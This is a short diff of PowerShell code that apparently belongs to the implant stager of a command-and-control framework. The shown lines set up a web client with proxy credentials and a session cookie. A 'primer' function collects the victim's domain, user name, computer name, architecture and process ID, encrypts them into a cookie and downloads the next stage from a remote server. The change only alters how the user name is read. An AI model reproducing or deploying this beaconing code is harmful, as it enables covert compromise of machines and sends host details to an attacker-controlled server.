@@ -138,7 +138,7 @@ $wc.Proxy.Credentials = $wc.Credentials;
 } if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
 $wc } 
 function primer {
-if ($env:username -eq "$($env:computername)$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
+try{$u=([Security.Principal.WindowsIdentity]::GetCurrent()).name} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
 $o="$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;%s"
 $pp=enc -key %s -un $o
 $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
